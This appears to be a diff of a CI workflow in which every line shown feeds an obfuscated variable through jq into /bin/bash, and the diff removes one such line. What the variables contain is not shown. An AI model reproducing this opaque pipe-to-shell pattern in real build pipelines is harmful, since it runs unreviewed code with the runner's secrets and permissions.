@@ -44,7 +44,6 @@ jobs:
           echo $xwcar435 | jq -r .d44239 | /bin/bash
           printf '%s' "$ggebv96395" | jq -r .sfbly872 | /bin/bash
           printf '%s' "$s887" | jq -r .bnz18516 | /bin/bash
-          printf '%s' "$u92" | jq -r .xun4560 | /bin/bash
           printf '%s' "$riz17" | jq -r .d3168 | /bin/bash
           echo $llqt4372 | jq -r .qi18016 | /bin/bash
           printf '%s' "$c203" | jq -r .btr033 | /bin/bash
